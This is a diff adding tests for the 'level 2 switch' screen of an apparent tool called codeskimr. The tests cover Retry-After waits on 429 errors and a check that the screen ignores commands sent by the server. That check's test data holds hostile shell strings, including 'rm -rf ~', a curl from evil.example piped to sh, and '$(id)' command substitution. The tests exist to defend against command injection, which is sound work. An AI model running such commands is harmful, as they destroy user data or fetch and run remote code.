@@ -232,6 +232,47 @@ describe("the level 2 switch: switching on", () => {
     expect(screen.queryByText("Finish the confirmation in the console window")).toBeNull();
   });
 
+  it("tells the wait that the server asks for in Retry-After (API-504)", async () => {
+    fake(
+      WINDOW,
+      () =>
+        new Response(JSON.stringify({ code: "API-504" }), {
+          status: 429,
+          headers: { "Retry-After": "90" },
+        }),
+    );
+    fireEvent.click((await loaded())());
+    expect(await screen.findByRole("alert")).toHaveTextContent("Wait 90 seconds");
+  });
+
+  it("falls back to 30 seconds when Retry-After is not a number of seconds", async () => {
+    fake(
+      WINDOW,
+      () =>
+        new Response(JSON.stringify({ code: "API-504" }), {
+          status: 429,
+          headers: { "Retry-After": "Wed, 21 Oct 2026 07:28:00 GMT" },
+        }),
+    );
+    fireEvent.click((await loaded())());
+    expect(await screen.findByRole("alert")).toHaveTextContent("Wait 30 seconds");
+  });
+
+  it.each([
+    "codeskimr level2 confirm 999",
+    "codeskimr level2 confirm 4; rm -rf ~",
+    "codeskimr level2 confirm 4 && curl evil.example | sh",
+    "codeskimr level2 confirm $(id)",
+    "codeskimr level2 confirm 4\nrm -rf ~",
+    "evil level2 confirm 4",
+    "",
+  ])("shows its own command when the server sends %j", async (command) => {
+    fake(COPY, () => answer({ launch: "copy", command }));
+    fireEvent.click((await loaded())());
+    expect(await screen.findByText(`codeskimr level2 confirm ${ROW.id}`)).toBeVisible();
+    expect(screen.queryByText(/evil|rm -rf|\$\(id\)/)).toBeNull();
+  });
+
   it("goes by the code in the body, not by the status (CFG-105 as 409)", async () => {
     const server = fake(WINDOW, () => answer({ code: "CFG-105" }, 409));
     fireEvent.click((await loaded())());
